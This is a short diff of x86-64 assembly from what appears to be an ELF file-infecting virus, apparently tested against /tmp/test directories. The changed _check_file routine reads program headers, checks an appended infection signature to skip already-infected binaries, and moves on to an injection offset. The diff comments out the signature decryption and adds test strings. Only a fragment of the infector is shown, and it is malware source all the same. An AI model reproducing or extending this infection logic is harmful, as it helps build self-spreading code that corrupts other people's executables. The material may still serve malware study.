@@ -203,19 +203,22 @@ _check_file:
 				add r8, [r14 + elf64_phdr.p_offset]
 				add r8, [r14 + elf64_phdr.p_filesz]
 				sub r8, signature_len
-				mov r9, [rel signature]
-				mov rdi, r9
-				mov r8, signature_len
-				mov rsi, r8
-				push rax
-				call _decrypt_str
-				mov r9, rax
-				pop rax
-				cmp qword r9, [r8]
+				; mov r9, [rel signature]
+				lea r9, signature
+				; mov rdi, r9
+				; mov rsi, signature_len
+				; push rax
+				; call _decrypt_str
+				; mov r9, rax
+				; pop rax
+				mov r10, [r9]
+				cmp qword r10, [r8]
 				je _unmap_close_inf
 				mov rdi, r9
 				mov rsi, signature_len
+				push rcx
 				call _unmap
+				pop rcx
 
 			_valid_seg_already_found:
 				mov r9, INF(infection.injection_offset)
@@ -554,6 +557,8 @@ _strlen:
 		ret
 
 
+num dq 0x45
+string db "ASimpleString", 0
 dir1        db  "/tmp/test", 0
 dir1Len    equ $ - dir1
 dir2        db  "/tmp/test2", 0
